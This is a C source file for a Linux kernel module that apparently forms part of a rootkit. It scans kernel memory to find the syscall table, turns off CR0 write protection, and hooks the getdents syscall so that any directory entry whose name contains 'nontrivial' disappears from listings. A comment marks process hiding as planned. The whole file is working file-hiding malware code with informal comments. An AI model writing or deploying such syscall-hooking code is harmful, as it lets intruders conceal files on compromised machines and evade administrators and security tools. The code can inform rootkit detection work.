#include <linux/kallsyms.h>
#include <uapi/asm/unistd.h>
#include <linux/dirent.h>
#include <asm/page.h>
#include <linux/fs.h>
#include <uapi/linux/limits.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/gfp.h>
#include <linux/uaccess.h>
#include <asm/uaccess.h>
#include <hooking.h>

unsigned long * sys_call_table;
unsigned long * find_systable(void);
int hook_dents(void);
asmlinkage long (*old_dents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
asmlinkage long new_dents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
	//amount of bois

	long ret = old_dents(fd, dirent, count);

	if (ret <= 0){
		//banned
		return ret;
	}
	//the return boi
	struct linux_dirent * ret_dir = kmalloc(ret, GFP_KERNEL);
	if (ret_dir ==NULL){
		return ret;
	}
	//the boi to move to kernel
	struct linux_dirent * ker_dir = kmalloc (ret, GFP_KERNEL);
	if (ker_dir == NULL){
		kfree(ret_dir);
		return ret;
	}
	//Yeet the dirent to kernel memory
	copy_from_user(ker_dir, dirent, ret);

	long new_len = 0;
	struct linux_dirent *temp;
	int offset = 0;

	while (offset < ret){
		unsigned char * cur_ref = (unsigned char *)ker_dir + offset;
		temp = (struct linux_dirent * )cur_ref;
		//Add hiding procs here later
		if (strstr(temp->d_name, "nontrivial") == NULL){
			//Add normal dirents to the ret dirent;
			memcpy((void *)ret_dir+new_len, temp, temp->d_reclen);
			new_len += temp->d_reclen;
		}else{
			printk(KERN_INFO "found hidden lad %s\n", temp->d_name);
		}
		offset += temp->d_reclen;
	}
	copy_to_user(dirent, ret_dir, new_len);
	kfree(ker_dir);
	kfree(ret_dir);
	return new_len;

}

#define START_SEARCH PAGE_OFFSET
#define END_SEARCH ULONG_MAX
unsigned long *find_systable (void) {
	unsigned long i;
	unsigned long *syscall_table;
	unsigned long sys_open_addr = kallsyms_lookup_name("sys_open");
	for (i = START_SEARCH; i < END_SEARCH; i+= sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_open] == (unsigned long)sys_open_addr) {
			return syscall_table;
		}
	}
	return NULL;
}
void unhook_dents(void){
	printk(KERN_INFO "unhooking getdents\n");
	write_cr0(read_cr0() & ~0x10000);
	sys_call_table[__NR_getdents] = old_dents;
	write_cr0(read_cr0() | 0x10000);
}
int hook_dents(void){
	printk(KERN_INFO "hooking getdents\n");
	if (!(sys_call_table = find_systable())){
		return -1;
	}
	old_dents = (void *)sys_call_table[__NR_getdents];
	printk(KERN_INFO "what is this boi %d", __NR_getdents);
	write_cr0(read_cr0() & ~0x10000);
	sys_call_table[__NR_getdents] = new_dents;
	write_cr0(read_cr0() | 0x10000);

	printk(KERN_INFO "new bois %p",  (void *)sys_call_table[__NR_getdents]);
	return 0;
}
